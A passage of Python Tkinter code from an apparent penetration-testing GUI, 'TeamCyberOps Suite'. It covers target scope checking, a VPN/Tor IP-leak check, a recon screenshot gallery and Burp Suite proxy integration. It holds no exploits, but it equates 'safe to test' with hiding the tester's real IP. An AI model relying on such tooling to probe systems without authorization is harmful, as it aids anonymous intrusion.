                          highlightthickness=1, highlightbackground=BORDER2)
            txt.pack(fill='both', expand=True)

            # Load existing scope
            try:
                cfg = load_cfg()
                proj_scopes = cfg.get("scope", {}).get(scope_proj.get(), {})
                existing = proj_scopes.get(scope_key, [])
                if existing:
                    txt.insert('end', "\n".join(existing))
            except Exception: pass

            def _save():
                entries = [l.strip() for l in txt.get('1.0','end').splitlines() if l.strip()]
                try:
                    cfg = load_cfg()
                    cfg.setdefault("scope", {}).setdefault(scope_proj.get(), {})[scope_key] = entries
                    save_cfg(cfg)
                    self.set_status(f"Scope saved: {len(entries)} entries", GREEN)
                except Exception as e:
                    messagebox.showerror("Save Error", str(e), parent=self.root)

            mk_btn(p, f"💾 Save Scope", _save, color, small=True).pack(anchor='w', pady=(6,0))
            return txt

        _make_scope_panel(in_f,  "in_scope",  GREEN)
        _make_scope_panel(out_f, "out_scope", RED)

        # Check target panel
        chk_inner = mk_frame(chk_f, bg=BG2); chk_inner.pack(fill='both', expand=True, padx=8, pady=8)
        tk.Label(chk_inner, text="Enter target to check if it's in scope:",
                 bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,6))
        r_chk = mk_frame(chk_inner, bg=BG2); r_chk.pack(fill='x')
        chk_var = tk.StringVar()
        mk_entry(r_chk, var=chk_var, w=40).pack(side='left', ipady=3)
        chk_result = tk.Label(chk_inner, text="", bg=BG2, fg=FG, font=MONO_B)
        chk_result.pack(anchor='w', pady=(8,0))

        def _check_scope():
            import fnmatch, ipaddress
            target = chk_var.get().strip()
            if not target: return
            try:
                cfg = load_cfg()
                proj_scope = cfg.get("scope", {}).get(scope_proj.get(), {})
                in_list  = proj_scope.get("in_scope",  [])
                out_list = proj_scope.get("out_scope", [])
            except Exception:
                in_list = out_list = []

            def _matches(target, pattern):
                try:
                    if '/' in pattern:
                        net = ipaddress.ip_network(pattern, strict=False)
                        return ipaddress.ip_address(target) in net
                except Exception: pass
                return fnmatch.fnmatch(target, pattern) or target == pattern

            is_out = any(_matches(target, p) for p in out_list)
            is_in  = any(_matches(target, p) for p in in_list)

            if is_out:
                chk_result.config(text=f"❌ OUT OF SCOPE: {target}", fg=RED)
            elif is_in:
                chk_result.config(text=f"✅ IN SCOPE: {target}", fg=GREEN)
            elif not in_list:
                chk_result.config(text=f"⚠ No scope defined — add entries above", fg=YELLOW)
            else:
                chk_result.config(text=f"❓ NOT IN SCOPE: {target} (not in any list)", fg=YELLOW)

        mk_btn(r_chk, "🔍 Check", _check_scope, ACCENT, small=True).pack(side='left', padx=8)

    # ═══════════════════════════════════════════════════════════════
    #  TIER 1: VPN / IP STATUS (upgrade existing settings_vpn)
    # ═══════════════════════════════════════════════════════════════
    def _settings_vpn(self, frame):
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "VPN & IP STATUS — Leak Detection", "🌐").pack(fill='x', pady=(0,8))

        # Live IP card
        ip_card = mk_card(pad, accent_top=True, accent_color=CYAN); ip_card.pack(fill='x', pady=(0,10))
        ip_inner = mk_frame(ip_card, bg=BG3); ip_inner.pack(fill='x', padx=12, pady=10)

        # Grid of IP info
        self._vpn_labels = {}
        for row, (lbl, key) in enumerate([
            ("Public IP:",    "public_ip"),
            ("Country:",      "country"),
            ("ISP/Org:",      "org"),
            ("VPN Detected:", "vpn"),
            ("Tor Exit:",     "tor"),
            ("City:",         "city"),
        ]):
            r = mk_frame(ip_inner, bg=BG3); r.pack(fill='x', pady=2)
            tk.Label(r, text=lbl, bg=BG3, fg=FG3, font=MONO_S, width=16, anchor='e').pack(side='left', padx=(0,8))
            lbl2 = tk.Label(r, text="—", bg=BG3, fg=FG, font=MONO_B)
            lbl2.pack(side='left')
            self._vpn_labels[key] = lbl2

        self._vpn_status = tk.Label(ip_inner, text="● Not checked",
                                     bg=BG3, fg=FG3, font=MONO_B)
        self._vpn_status.pack(anchor='w', pady=(8,0))

        # IP history
        mk_section(pad, "IP CHANGE HISTORY", "📋").pack(fill='x', pady=(12,6))
        self._ip_hist_tree = mk_tree(pad,
            columns=('Time','IP','Country','VPN'),
            show='headings', height=8)
        for c, w in [('Time',110),('IP',140),('Country',100),('VPN',80)]:
            self._ip_hist_tree.heading(c, text=c, anchor='w')
            self._ip_hist_tree.column(c, width=w, anchor='w')
        self._ip_hist_tree.tag_configure('vpn',    foreground=GREEN, background=BG3)
        self._ip_hist_tree.tag_configure('no_vpn', foreground=RED, background=BG3)
        vsb_ip = ttk.Scrollbar(pad, orient='vertical', command=self._ip_hist_tree.yview)
        self._ip_hist_tree.configure(yscrollcommand=vsb_ip.set)
        tf_ip = mk_frame(pad, bg=BG2); tf_ip.pack(fill='x')
        self._ip_hist_tree.pack(side='left', fill='x', expand=True, in_=tf_ip)
        vsb_ip.pack(side='right', fill='y', in_=tf_ip)

        def _check_ip():
            self._vpn_status.config(text="● Checking...", fg=CYAN)
            self.root.update()
            def _go():
                data = {}
                # ipinfo.io — full info
                try:
                    import urllib.request as _ur, json as _j
                    r = _ur.urlopen("https://ipinfo.io/json", timeout=8)
                    data = _j.loads(r.read())
                except Exception: pass
                # ip-api.com for VPN detection
                vpn_info = {}
                try:
                    r2 = _ur.urlopen("http://ip-api.com/json?fields=status,country,isp,proxy,hosting,query", timeout=6)
                    vpn_info = _j.loads(r2.read())
                except Exception: pass

                pub_ip  = data.get('ip', vpn_info.get('query', '?'))
                country = data.get('country', vpn_info.get('country','?'))
                org     = data.get('org', vpn_info.get('isp','?'))
                city    = data.get('city','?')
                is_vpn  = vpn_info.get('proxy') or vpn_info.get('hosting') or 'vpn' in org.lower()
                # Tor check
                is_tor  = False
                try:
                    tor_r = _ur.urlopen("https://check.torproject.org/api/ip", timeout=5)
                    tor_data = _j.loads(tor_r.read())
                    is_tor = tor_data.get('IsTor', False)
                except Exception: pass

                from datetime import datetime as _dt
                ts = _dt.now().strftime("%H:%M:%S")

                def _upd():
                    self._vpn_labels['public_ip'].config(text=pub_ip,   fg=NEON if pub_ip!='?' else RED)
                    self._vpn_labels['country'].config(text=country,    fg=FG)
                    self._vpn_labels['org'].config(text=org[:40],        fg=FG)
                    self._vpn_labels['city'].config(text=city,           fg=FG)
                    vpn_txt  = "✅ YES (Protected)"  if is_vpn  else "⚠ NOT DETECTED"
                    vpn_clr  = GREEN                  if is_vpn  else YELLOW
                    tor_txt  = "✅ YES (Anonymous)"  if is_tor  else "❌ NO"
                    tor_clr  = GREEN                  if is_tor  else RED
                    self._vpn_labels['vpn'].config(text=vpn_txt, fg=vpn_clr)
                    self._vpn_labels['tor'].config(text=tor_txt, fg=tor_clr)
                    if is_vpn or is_tor:
                        self._vpn_status.config(text="● PROTECTED — Safe to test", fg=GREEN)
                    else:
                        self._vpn_status.config(text="⚠  NO VPN DETECTED — REAL IP EXPOSED", fg=RED)
                    # Add to history
                    tag = 'vpn' if is_vpn or is_tor else 'no_vpn'
                    self._ip_hist_tree.insert('',0,
                        values=(ts, pub_ip, country, "YES" if is_vpn else "NO"),
                        tags=(tag,))
                self.root.after(0, _upd)
            threading.Thread(target=_go, daemon=True).start()

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(8,0))
        mk_btn(bf, "🔍 Check My IP / VPN Status", _check_ip, CYAN).pack(side='left', ipady=5, padx=(0,8))
        mk_btn(bf, "🔄 Auto-check on Startup",
               lambda: self.set_status("Auto-check enabled (check on each session)", GREEN),
               FG2, small=True).pack(side='left', padx=4)
        # Auto-check on open
        self.root.after(800, _check_ip)

    # ═══════════════════════════════════════════════════════════════
    #  TIER 1: SCREENSHOT GALLERY TAB
    # ═══════════════════════════════════════════════════════════════
    def _build_screenshot_tab(self, frame):
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "SCREENSHOT GALLERY — Auto-Captured Hosts", "📸").pack(fill='x', pady=(0,8))

        info = mk_card(pad, accent_top=True, accent_color=PURPLE); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text=(
            "  All screenshot URLs here — taken during Auto-Recon or manually via Recon tab\n"
            "  Double-click = open in browser  ·  Click file = view inline preview\n"
            "  Uses gowitness (Go) or Python PIL fallback"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=6)

        # Filter row
        fr = mk_frame(pad, bg=BG2); fr.pack(fill='x', pady=(0,8))
        tk.Label(fr, text="🔍", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        ss_search = tk.StringVar()
        mk_entry(fr, var=ss_search, w=28).pack(side='left', padx=6, ipady=3)
        ss_search.trace_add('write', lambda *_: self.root.after(200, _refresh_ss))
        mk_btn(fr, "🔄 Refresh",   lambda: _refresh_ss(),       FG3, small=True).pack(side='left', padx=4)
        mk_btn(fr, "📂 Open Folder",
               lambda: open_folder(str(SCREENSHOTS)),          FG2, small=True).pack(side='left', padx=4)
        mk_btn(fr, "📸 Take Screenshots",
               lambda: (self._goto_tab("Recon"), self.set_status("Go to Recon → Active → Screenshot", CYAN)),
               PURPLE, small=True).pack(side='right', padx=4)

        # Split: file list left, preview right
        paned = tk.PanedWindow(pad, orient='horizontal', bg=BG, sashwidth=4)
        paned.pack(fill='both', expand=True)

        left = mk_frame(paned, bg=BG2); paned.add(left, width=440)
        cols_ss = ('Filename','Host','Size','Date')
        self._ss_tree = mk_tree(left, columns=cols_ss, show='headings', height=24)
        for c, w in [('Filename',180),('Host',140),('Size',65),('Date',100)]:
            self._ss_tree.heading(c, text=c, anchor='w')
            self._ss_tree.column(c, width=w, anchor='w')
        self._ss_tree.tag_configure('png', foreground=CYAN, background=BG3)
        self._ss_tree.tag_configure('jpg', foreground=GREEN, background=BG3)
        vsb_ss = ttk.Scrollbar(left, orient='vertical', command=self._ss_tree.yview)
        self._ss_tree.configure(yscrollcommand=vsb_ss.set)
        tf_ss = mk_frame(left, bg=BG2); tf_ss.pack(fill='both', expand=True)
        self._ss_tree.pack(side='left', fill='both', expand=True, in_=tf_ss)
        vsb_ss.pack(side='right', fill='y', in_=tf_ss)

        # Right: info + preview placeholder
        right = mk_frame(paned, bg=BG2); paned.add(right)
        tk.Label(right, text="PREVIEW", bg=BG2, fg=ACCENT, font=MONO_B).pack(padx=10, pady=(10,4), anchor='w')
        self._ss_preview_lbl = tk.Label(right,
            text="Double-click a screenshot\nto open in browser",
            bg=BG3, fg=FG3, font=MONO_S, width=32, height=12,
            justify='center', relief='flat',
            highlightthickness=1, highlightbackground=BORDER2)
        self._ss_preview_lbl.pack(padx=10, pady=4, fill='x')
        self._ss_info_lbl = tk.Label(right, text="", bg=BG2, fg=FG2, font=MONO_S,
                                      justify='left', wraplength=240)
        self._ss_info_lbl.pack(padx=10, pady=4, anchor='w')

        def _refresh_ss():
            q = ss_search.get().lower()
            self._ss_tree.delete(*self._ss_tree.get_children())
            SCREENSHOTS.mkdir(exist_ok=True)
            # Also scan project screenshot dirs
            all_ss = (list(SCREENSHOTS.rglob("*.png")) +
                      list(SCREENSHOTS.rglob("*.jpg")) +
                      list(LOGS_DIR.rglob("*.png")) +
                      list(LOGS_DIR.rglob("*.jpg")))
            # Remove duplicates by path
            seen = set()
            unique = []
            for f in all_ss:
                if str(f) not in seen:
                    seen.add(str(f)); unique.append(f)
            unique.sort(key=lambda x: x.stat().st_mtime, reverse=True)
            for f in unique:
                if q and q not in f.name.lower(): continue
                try:
                    sz   = f.stat().st_size
                    szs  = f"{sz//1024}KB" if sz>1024 else f"{sz}B"
                    date = datetime.fromtimestamp(f.stat().st_mtime).strftime("%m-%d %H:%M")
                    host = f.stem.replace("_",".").replace("-",".") if "_" in f.stem else f.stem
                    tag  = 'png' if f.suffix=='.png' else 'jpg'
                    self._ss_tree.insert('','end',
                        values=(f.name, host[:30], szs, date),
                        tags=(tag,), iid=str(f))
                except Exception: pass

        def _on_select(e):
            sel = self._ss_tree.selection()
            if not sel: return
            fpath = Path(str(sel[0]))
            if not fpath.exists(): return
            try:
                sz = fpath.stat().st_size
                info_txt = (f"File:  {fpath.name}\n"
                            f"Path:  {fpath.parent.name}/\n"
                            f"Size:  {sz//1024} KB\n"
                            f"Date:  {datetime.fromtimestamp(fpath.stat().st_mtime).strftime('%Y-%m-%d %H:%M')}")
                self._ss_info_lbl.config(text=info_txt)
                # Try thumbnail with PIL
                try:
                    from PIL import Image, ImageTk
                    img = Image.open(fpath)
                    img.thumbnail((280, 180), Image.LANCZOS)
                    photo = ImageTk.PhotoImage(img)
                    self._ss_preview_lbl.config(image=photo, text='')
                    self._ss_preview_lbl.image = photo
                except ImportError:
                    self._ss_preview_lbl.config(
                        text=f"📸 {fpath.name}\n\n(Install Pillow for\nimage preview:\npip install Pillow)")
            except Exception: pass

        def _open_in_browser(e):
            sel = self._ss_tree.selection()
            if not sel: return
            fpath = Path(str(sel[0]))
            if fpath.exists():
                import webbrowser
                webbrowser.open(fpath.as_uri())

        self._ss_tree.bind('<<TreeviewSelect>>', _on_select)
        self._ss_tree.bind('<Double-1>', _open_in_browser)

        _refresh_ss()

    # ═══════════════════════════════════════════════════════════════
    #  TIER 1: BURP INTEGRATION (in proxy settings)
    # ═══════════════════════════════════════════════════════════════
    def _settings_proxy(self, frame):
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "PROXY & BURP SUITE INTEGRATION", "🔌").pack(fill='x', pady=(0,8))

        nb_px = ttk.Notebook(pad); nb_px.pack(fill='both', expand=True)
        f_burp = tk.Frame(nb_px, bg=BG2); nb_px.add(f_burp, text="  🔴 Burp Suite  ")
        f_prox = tk.Frame(nb_px, bg=BG2); nb_px.add(f_prox, text="  🌐 Proxy Config  ")
        f_req  = tk.Frame(nb_px, bg=BG2); nb_px.add(f_req,  text="  📡 Send to Burp  ")

        # ── Burp Suite tab ─────────────────────────────────────
        bp = mk_frame(f_burp, bg=BG2); bp.pack(fill='both', expand=True, padx=12, pady=10)
        mk_section(bp, "BURP SUITE INTEGRATION", "🔴").pack(fill='x', pady=(0,8))
        burp_info = mk_card(bp, accent_top=True, accent_color=RED); burp_info.pack(fill='x', pady=(0,10))
        for line in ["Route ALL tool requests through Burp Suite Proxy",
                     "See every request TeamCyberOps makes in Burp History",
                     "Modify requests in Burp → send back to framework"]:
            tk.Label(burp_info, text=f"  {line}", bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=4, pady=1)
        tk.Frame(burp_info, height=4, bg=BG3).pack()

        try: cfg = load_cfg()
        except Exception: cfg = {}
        burp_vars = {}
        for lbl, key, default in [
            ("Burp Host:", "burp_host", "127.0.0.1"),
            ("Burp Port:", "burp_port", "8080"),
        ]:
            r = mk_frame(bp, bg=BG2); r.pack(fill='x', pady=4)
            tk.Label(r, text=lbl, bg=BG2, fg=FG3, font=MONO_S, width=14, anchor='e').pack(side='left', padx=(0,8))
            v = tk.StringVar(value=cfg.get("proxy",{}).get(key, default))
            mk_entry(r, var=v, w=22).pack(side='left', ipady=3)
            burp_vars[key] = v

        burp_enable = tk.BooleanVar(value=cfg.get("proxy",{}).get("enabled", False))
        ttk.Checkbutton(bp, text="Route all requests through Burp proxy",
                       variable=burp_enable).pack(anchor='w', pady=4)

        # Status
        self._burp_status = tk.Label(bp, text="● Not tested", bg=BG2, fg=FG3, font=MONO_B)
        self._burp_status.pack(anchor='w', pady=(4,0))

        def _test_burp():
            host = burp_vars['burp_host'].get()
            try: port = int(burp_vars['burp_port'].get())
            except Exception: port = 8080
            import socket as _s
            try:
                with _s.create_connection((host, port), timeout=3):
                    self._burp_status.config(
                        text=f"● BURP RUNNING at {host}:{port}", fg=GREEN)
                    self.set_status(f"Burp Suite detected at {host}:{port}", GREEN)
            except Exception:
                self._burp_status.config(
                    text=f"● Burp NOT running at {host}:{port}", fg=RED)
                self.set_status(f"Burp not found at {host}:{port}", RED)

        def _save_burp():
            try:
                cfg2 = load_cfg()
                cfg2.setdefault("proxy", {}).update({
                    "burp_host": burp_vars['burp_host'].get(),
                    "burp_port": burp_vars['burp_port'].get(),
                    "enabled":   burp_enable.get(),
                })
                save_cfg(cfg2)
                self.set_status("Burp proxy settings saved", GREEN)
            except Exception as e:
                messagebox.showerror("Error", str(e), parent=self.root)

        bf_b = mk_frame(bp, bg=BG2); bf_b.pack(fill='x', pady=(8,0))
        mk_btn(bf_b, "🔴 Test Burp Connection", _test_burp,  RED).pack(side='left', ipady=5, padx=(0,8))
        mk_btn(bf_b, "💾 Save",                 _save_burp,  GREEN, small=True).pack(side='left', padx=4)

        # Instructions
        inst = mk_card(bp); inst.pack(fill='x', pady=(12,0))
        tk.Label(inst, text=(
            "  SETUP:\n"
            "  1. Open Burp Suite → Proxy → Options\n"
            "  2. Add listener: 127.0.0.1:8080\n"
            "  3. Enable proxy above + Save\n"
            "  4. All TeamCyberOps requests will appear in Burp HTTP History\n\n"
            "  TIP: Use Burp Suite Free — proxy + repeater is free forever"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        # ── Proxy Config tab ───────────────────────────────────
        pp = mk_frame(f_prox, bg=BG2); pp.pack(fill='both', expand=True, padx=12, pady=10)
        mk_section(pp, "HTTP/HTTPS PROXY SETTINGS", "🌐").pack(fill='x', pady=(0,8))
        try: pcfg = load_cfg().get("proxy",{})
        except Exception: pcfg = {}
        px_vars = {}
        for lbl, key, default, show in [
            ("HTTP Proxy:",     "http_proxy",  "", False),
            ("HTTPS Proxy:",    "https_proxy", "", False),
            ("SOCKS5 Proxy:",   "socks5_proxy","", False),
        ]:
            r = mk_frame(pp, bg=BG2); r.pack(fill='x', pady=4)
            tk.Label(r, text=lbl, bg=BG2, fg=FG3, font=MONO_S, width=14, anchor='e').pack(side='left', padx=(0,8))
            v = tk.StringVar(value=pcfg.get(key, default))
            mk_entry(r, var=v, w=36).pack(side='left', ipady=3)
            tk.Label(r, text="host:port", bg=BG2, fg=FG3, font=MONO_T).pack(side='left', padx=8)
            px_vars[key] = v

        def _save_proxy():
            try:
                cfg2 = load_cfg()
                for k, v in px_vars.items():
                    cfg2.setdefault("proxy",{})[k] = v.get()
                save_cfg(cfg2)
                # Set env vars
                import os
                for k, v in px_vars.items():
                    if v.get():
                        os.environ[k.upper()] = v.get()
                self.set_status("Proxy saved + applied to environment", GREEN)
            except Exception as e:
                messagebox.showerror("Error", str(e), parent=self.root)

        mk_btn(pp, "💾 Save & Apply Proxy", _save_proxy, ACCENT).pack(anchor='w', pady=(8,0), ipady=4)

        # ── Send to Burp tab ───────────────────────────────────
        rp = mk_frame(f_req, bg=BG2); rp.pack(fill='both', expand=True, padx=12, pady=10)
        mk_section(rp, "SEND RAW REQUEST TO BURP REPEATER", "📡").pack(fill='x', pady=(0,8))
        tk.Label(rp, text="Paste raw HTTP request — click Send to forward to Burp:",
                 bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,4))
        req_txt = tk.Text(rp, height=14, bg=BG3, fg=CYAN, font=(_MONO_FACE,9),
                          relief='flat', bd=0, insertbackground=ACCENT, padx=8, pady=6,
                          highlightthickness=1, highlightbackground=BORDER2)
        req_txt.pack(fill='both', expand=True)
        req_txt.insert('end',
            "POST /api/login HTTP/1.1\r\n"
            "Host: target.com\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: 40\r\n\r\n"
            '{"username":"admin","password":"test"}')
        resp_lbl = tk.Label(rp, text="", bg=BG2, fg=FG3, font=MONO_S)
        resp_lbl.pack(anchor='w', pady=(4,0))

        def _send_to_burp():
            raw = req_txt.get('1.0','end').strip()
            if not raw: return
            try:
                host = burp_vars.get('burp_host', tk.StringVar(value='127.0.0.1')).get()
                port = int(burp_vars.get('burp_port', tk.StringVar(value='8080')).get())
                import socket as _s
                with _s.create_connection((host, port), timeout=5) as sock:
                    sock.sendall(raw.encode() + b"\r\n\r\n")
                    data = b""
                    sock.settimeout(3)
                    try: data = sock.recv(4096)
                    except Exception: pass
                resp_lbl.config(
                    text=f"✅ Sent to Burp {host}:{port} — check Proxy > HTTP History",
                    fg=GREEN)
            except Exception as e:
                resp_lbl.config(text=f"❌ Error: {e}", fg=RED)

        mk_btn(rp, "🔴 Send to Burp", _send_to_burp, RED).pack(anchor='w', pady=(8,0), ipady=4)

    # ═════════════════════════════════════════════════════════════
    #  APP LIFECYCLE
    # ═════════════════════════════════════════════════════════════
    def _logout(self):
        if messagebox.askyesno("Logout","Return to login screen?", parent=self.root):
            write_audit(f"LOGOUT | user={self.user['username']}")
            self.root.destroy(); main()

    def _on_close(self):
        if messagebox.askyesno("Exit","Exit TeamCyberOps Suite?", parent=self.root):
            write_audit(f"EXIT | user={self.user['username']}")
            self.root.destroy()


# ══════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════
def main():
    # Try GUI mode first, fall back to error handling
    try:
        login = LoginWindow()
        if login.user:
            App(login.user)
        else:
            print("Login cancelled.")
    except Exception as e:
        # Check if it's a display error
        if "no display" in str(e).lower() or "tclError" in str(type(e).__name__):
            print("[!] ERROR: No display server found (required for GUI)")
            print("[*] You're running in WSL without X11 forwarding")
            print("\n[?] To enable GUI in WSL:")
            print("   1. Install VcXsrv or Xming on Windows")
            print("   2. Run this in WSL: export DISPLAY=localhost:0")
            print("   3. Or run directly from Windows CMD:")
            print("      cd C:\\Users\\User\\Desktop\\TeamCyberOps")
            print("      python main.py")
            sys.exit(1)
        else:
            # Other error
            print(f"[!] Startup error: {e}")
            import traceback
            traceback.print_exc()
            sys.exit(1)


if __name__ == "__main__":
    main()
